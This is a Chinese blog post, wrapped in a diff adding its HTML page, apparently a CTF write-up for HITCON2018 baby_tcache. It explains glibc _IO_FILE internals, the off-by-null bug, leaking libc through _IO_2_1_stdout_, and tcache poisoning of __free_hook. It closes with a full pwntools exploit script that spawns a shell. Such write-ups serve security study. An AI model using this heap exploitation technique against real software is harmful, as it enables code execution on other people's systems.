@@ -1,0 +1,1068 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon00.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前段时间在学习tcache attack，先不介绍tcache是个啥，也不介绍什么保护机制什么乱七八糟的，因为👴是懒🐕，所以先咕咕咕了，这些东西后续找时间补上">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON2018_baby_tcache">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;20&#x2F;HITCON2018-baby-tcache&#x2F;index.html">
+<meta property="og:site_name" content="N0vice&#39;s Blog">
+<meta property="og:description" content="前段时间在学习tcache attack，先不介绍tcache是个啥，也不介绍什么保护机制什么乱七八糟的，因为👴是懒🐕，所以先咕咕咕了，这些东西后续找时间补上">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;20&#x2F;HITCON2018-baby-tcache&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;20&#x2F;HITCON2018-baby-tcache&#x2F;2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;20&#x2F;HITCON2018-baby-tcache&#x2F;3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;20&#x2F;HITCON2018-baby-tcache&#x2F;4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;20&#x2F;HITCON2018-baby-tcache&#x2F;5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;20&#x2F;HITCON2018-baby-tcache&#x2F;6.png">
+<meta property="article:published_time" content="2020-05-19T16:10:47.000Z">
+<meta property="article:modified_time" content="2020-05-21T15:09:37.564Z">
+<meta property="article:author" content="N0vice">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;05&#x2F;20&#x2F;HITCON2018-baby-tcache&#x2F;1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/05/20/HITCON2018-baby-tcache/"/>
+
+
+
+
+
+  <title>HITCON2018_baby_tcache | N0vice's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.1.0"></head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+<script src="/live2d-widget/autoload.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">N0vice's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/20/HITCON2018-baby-tcache/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="N0vice">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="N0vice's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HITCON2018_baby_tcache</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-20T00:10:47+08:00">
+                2020-05-20
+              </time>
+            
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>前段时间在学习tcache attack，先不介绍tcache是个啥，也不介绍什么保护机制什么乱七八糟的，因为👴是懒🐕，所以先咕咕咕了，这些东西后续找时间补上  <a id="more"></a><br>这篇就讲一个题，HITCON2018_baby_tcache，这个题算是很经典的<br>首先分析程序，保护全开 got不可写，没有show函数  </p>
+<pre><code class="shell">[*] &#39;/home/imlyp/桌面/HITCON2018_babytcache/baby_tcache&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled</code></pre>
+<p><img src="1.png" alt=""><br>free后置零，不存在double free<br><img src="2.png" alt=""><br>并且存在off by null漏洞<br><img src="3.png" alt=""><br>但是程序中没有show函数，所以很难leak libc，但是我们可以利用_IO_2_1_stdout，我们修改他的结构体中的值，就可以达到打印libc地址的目的<br>👴回来写🌶<br>程序中存在puts函数，而puts函数会调用_IO_puts，然后会调用_IO_new_file_overflow ，然后会调用_IO_do_write（禁止套娃），在_IO_do_write中可以泄露出_IO_write_base ~ _IO_write_ptr这段缓冲区中的数据，并且这段缓冲区和libc_base偏移固定<br>贴上源码，调用puts函数时<br>IO_puts源码  </p>
+<pre><code class="C++"><span class="keyword">int</span>
+_IO_puts (<span class="keyword">const</span> <span class="keyword">char</span> *str)
+{
+  <span class="keyword">int</span> result = EOF;
+  _IO_size_t len = <span class="built_in">strlen</span> (str);
+  _IO_acquire_lock (_IO_stdout);
+  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span>
+       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)
+      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len
+      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, _IO_stdout) != EOF)
+    result = MIN (INT_MAX, len + <span class="number">1</span>);
+  _IO_release_lock (_IO_stdout);
+  <span class="keyword">return</span> result;
+}</code></pre>
+<pre><code class="C++"><span class="keyword">int</span>
+_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)
+{
+  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) 
+    {
+      f-&gt;_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      <span class="keyword">return</span> EOF;
+    }
+  <span class="comment">/* If currently reading or no buffer allocated. */</span>
+  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>) 
+    {
+      :
+      :
+    }
+  <span class="keyword">if</span> (ch == EOF)
+    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<span class="comment">// 需要调用的目标，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处存在有价值的地址 （libc 地址）则可进行泄露</span>
+    <span class="comment">// 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写</span></code></pre>
+<p>上面的源码可知，当_IO_read_end与_IO_write_base不想等的时候就会打印者之间的字符，其中就有可能会有我们需要的leak，我们再接着看一下函数_IO_do_write,这个函数实际调用的时候会用到new_do_write函数</p>
+<pre><code class="C++">atic
+_IO_size_t
+new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)
+{
+  _IO_size_t count;
+  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)  <span class="comment">/* 需要满足 */</span>
+    <span class="comment">/* On a system without a proper O_APPEND implementation,</span>
+<span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span>
+<span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span>
+<span class="comment">       Instead, just indicate that offset (before and after) is</span>
+<span class="comment">       unpredictable. */</span>
+    fp-&gt;_offset = _IO_pos_BAD;
+  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)
+    {
+      _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);
+      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)
+        <span class="keyword">return</span> <span class="number">0</span>;
+      fp-&gt;_offset = new_pos;
+    }
+  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">// 这里真正进行 write</span></code></pre>
+<p>我们需要程序执行 _IO_SYSWRITE函数，_IO_SYSWRITE(fp, data, to_do)就是函数write(fp-&gt;fileno, data, to_do)的原型，因此如果我们能修改相应的参数，使程序运行到这里，那么久会输出 f-&gt;_IO_write_base中的数据，而这些数据里面，就会存在固定的libc中的地址<br>需要满足fp-&gt;_flags &amp; _IO_IS_APPENDING != 0 或 fp-&gt;_IO_read_end != fp-&gt;_IO_write_base，我们没办法同时控制_IO_write_base和_IO_read_end，所以我们只要fp-&gt;_flags &amp; _IO_IS_APPENDING == 1就行了<br>综上所述，我们需要满足条件：  </p>
+<pre><code class="C++">_flags = <span class="number">0xfbad0000</span>   <span class="comment">// 这个0xfbad是magic number，不用管它</span>
+_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span>
+_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span>
+_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></code></pre>
+<p>我们看看IO_FILE的一些flags  </p>
+<pre><code class="C++">#_IO_FILE flags
+
+<span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number */</span></span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don't deallocate buffer on close. */</span></span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED        0x0002</span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN          0x0010</span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN          0x0020</span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don't call close(_fileno) on close.  */</span></span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP         0x0100</span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF          0x0200</span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING      0x1000</span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF        0x2000</span>
+                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span>
+<span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK         0x8000</span>
+
+_flags=_IO_MAGIC+_IO_CURRENTLY_PUTTING+_IO_IS_APPENDING+（_IO_LINKED）
+
+_flags=<span class="number">0xfbad1800</span> <span class="keyword">or</span> <span class="number">0xfbad1880</span> 或者再加一些其他不影响leak的_flags</code></pre>
+<p>我们在gdb中看一下<em>IO_2_1_stdout结构体<br><img src="4.png" alt=""><br>只要把flags改成0xfbad1800就能满足条件，后面三个全部改成0，使其没有差值，就不会触发read的操作<br>整体思路：<br>①add 7个chunk，最后一个chunk是防止与top chunk合并的<br>②free掉chunk4并重新申请回来，通过prev_size的复用，将chunk5的prev_size修改为0x660，再依次free掉2、0、5，可以构造chunk overlap<br>③free掉的chunk2进入了tcache，然后通过off by null并触发unlink，再申请一个0+1的size之后，unsorted bin起始位置会在chunk2上，再申请一块chunk，就会从unsorted bin中切出来，并且fd指向main_arena+96<br>④修改tcache中指向main_arena+96的低两字节，使其指向_IO_2_1_stdout</em><br>改之前是这样<br><img src="5.png" alt=""><br>修改之后变成这样<br><img src="6.png" alt=""><br>⑤再次申请两个该size的chunk，就会申请到_IO_2_1_stdout_，对其结构体进行修改，使其满足能leak libc的条件<br>⑥tcache attack打free_hook为one_gadget<br>（这里我尝试打malloc_hook为one_gadget没有成功，realloc调整栈帧也没有成功，打free_hook为system也没有成功，所以无奈之下选择了打free_hook为one_gadget，这些没有成功不知道是为什么）<br>exp  </p>
+<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
+<span class="comment">#coding=utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+<span class="keyword">import</span> sys
+<span class="comment">#context.log_level = 'debug'</span>
+context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,timeout=<span class="number">1</span>) 
+context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
+binary = <span class="string">'./baby_tcache'</span> 
+local = <span class="number">1</span>
+<span class="keyword">if</span> local == <span class="number">1</span>:
+    p=process(binary)
+<span class="keyword">else</span>:
+    p=remote(<span class="string">""</span>,)
+elf=ELF(binary)
+libc=ELF(<span class="string">"libc.so.6"</span>)
+<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span>
+    p.recvuntil(<span class="string">"choice: "</span>)
+    p.sendline(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"Size:"</span>)
+    p.sendline(str(size))
+    p.recvuntil(<span class="string">"Data:"</span>)
+    p.send(content)
+<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"choice: "</span>)
+    p.sendline(<span class="string">"2"</span>)
+    p.recvuntil(<span class="string">"Index:"</span>)
+    p.sendline(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
+    add(<span class="number">0x4f8</span>,<span class="string">"a"</span>) <span class="comment"># 0</span>
+    add(<span class="number">0x30</span>,<span class="string">"a"</span>) <span class="comment"># 1</span>
+    add(<span class="number">0x40</span>,<span class="string">"a"</span>) <span class="comment"># 2</span>
+    add(<span class="number">0x50</span>,<span class="string">"a"</span>) <span class="comment"># 3</span>
+    add(<span class="number">0x60</span>,<span class="string">"a"</span>) <span class="comment"># 4</span>
+    add(<span class="number">0x4f8</span>,<span class="string">"a"</span>) <span class="comment"># 5</span>
+    add(<span class="number">0x10</span>,<span class="string">"a"</span>) <span class="comment"># 6</span>
+    free(<span class="number">4</span>)
+    add(<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">0x60</span>+p16(<span class="number">0x660</span>)) <span class="comment"># 4</span>
+    free(<span class="number">2</span>)
+    free(<span class="number">0</span>)
+    free(<span class="number">5</span>)
+
+    add(<span class="number">0x530</span>,<span class="string">"a"</span>)
+
+    free(<span class="number">4</span>)
+    add(<span class="number">0xa0</span>,<span class="string">"\x60\x07"</span>)
+    add(<span class="number">0x40</span>,<span class="string">"a"</span>)
+    payload = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"\x00"</span>
+    add(<span class="number">0x3f</span>,payload)
+
+    addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))
+    log.success(<span class="string">"addr==&gt;"</span> + hex(addr))
+    libc_base = addr - <span class="number">0x3ed8b0</span>
+    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
+    malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]
+    free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]
+    system = libc_base + libc.sym[<span class="string">'system'</span>]
+    realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]
+    one = libc_base + <span class="number">0x4f322</span>
+
+    log.success(<span class="string">"malloc_hook==&gt;"</span> + hex(malloc_hook))
+    log.success(<span class="string">"free_hook==&gt;"</span> + hex(free_hook))
+    log.success(<span class="string">"system==&gt;"</span> + hex(system))
+    add(<span class="number">0x70</span>,p64(free_hook))
+    add(<span class="number">0x60</span>,<span class="string">"/bin/sh\x00"</span>)
+    add(<span class="number">0x60</span>,p64(one))
+
+    free(<span class="number">5</span>)
+
+    p.interactive()
+exp()</code></pre>
+<p>参考链接：<br><a href="https://p1kk.github.io/2019/12/03/Tcache%20Attack%E5%AD%A6%E4%B9%A0/tcache/#%F0%9F%94%BAHITCON2018-baby-tcache" target="_blank" rel="noopener">https://p1kk.github.io/2019/12/03/Tcache%20Attack%E5%AD%A6%E4%B9%A0/tcache/#%F0%9F%94%BAHITCON2018-baby-tcache</a><br><a href="http://pollux.cc/2019/05/03/2018-hitcon-baby-tcache/" target="_blank" rel="noopener">http://pollux.cc/2019/05/03/2018-hitcon-baby-tcache/</a><br><a href="https://zszcr.github.io/2019/03/18/2019-3-18-tcache%E4%B8%8B%E7%9A%84%E5%87%A0%E9%81%93pwn%E9%A2%98/#hitcon2018-baby-tcache" target="_blank" rel="noopener">https://zszcr.github.io/2019/03/18/2019-3-18-tcache%E4%B8%8B%E7%9A%84%E5%87%A0%E9%81%93pwn%E9%A2%98/#hitcon2018-baby-tcache</a><br><a href="http://dittozzz.top/2019/04/24/IO-FILE%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">http://dittozzz.top/2019/04/24/IO-FILE%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/</a><br><a href="https://xz.aliyun.com/t/6473#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6473#toc-3</a><br><a href="https://www.jianshu.com/p/c6a585d46bc0" target="_blank" rel="noopener">https://www.jianshu.com/p/c6a585d46bc0</a>  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的鼓励将支持我继续努力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="N0vice 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="N0vice 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    N0vice
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/05/20/HITCON2018-baby-tcache/" title="HITCON2018_baby_tcache">http://yoursite.com/2020/05/20/HITCON2018-baby-tcache/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/16/%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86vm-pwn/" rel="next" title="一道题认识vm pwn">
+                <i class="fa fa-chevron-left"></i> 一道题认识vm pwn
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/24/DASCTF-%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF-write-up/" rel="prev" title="DASCTF&第三届BJDCTF write up">
+                DASCTF&第三届BJDCTF write up <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="N0vice" />
+            
+              <p class="site-author-name" itemprop="name">N0vice</p>
+              <p class="site-description motion-element" itemprop="description">从前我是瞎的，如今我看得见</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/N0vice21" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/luo-yu-piao" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-zhihu"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://spacey.top/" title="Elli0t" target="_blank">Elli0t</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ericdshen.com/" title="EDS" target="_blank">EDS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://migraine-sudo.github.io" title="Migraine" target="_blank">Migraine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shawroot.cc/" title="Root" target="_blank">Root</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.yuque.com/pi3ntn/azmee3" title="Lime" target="_blank">Lime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mrbelieve128.github.io/" title="Mr.Believe" target="_blank">Mr.Believe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://l0x1c.github.io/" title="L0x1c" target="_blank">L0x1c</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://binlep.top/" title="binlep" target="_blank">binlep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://1p0ch.cn/" title="1p0ch" target="_blank">1p0ch</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://retr0.vip/" title="Retr_0" target="_blank">Retr_0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hackerpoet.com/" title="T4rn" target="_blank">T4rn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/SopRomeo" title="penson" target="_blank">penson</a>
+                  </li>
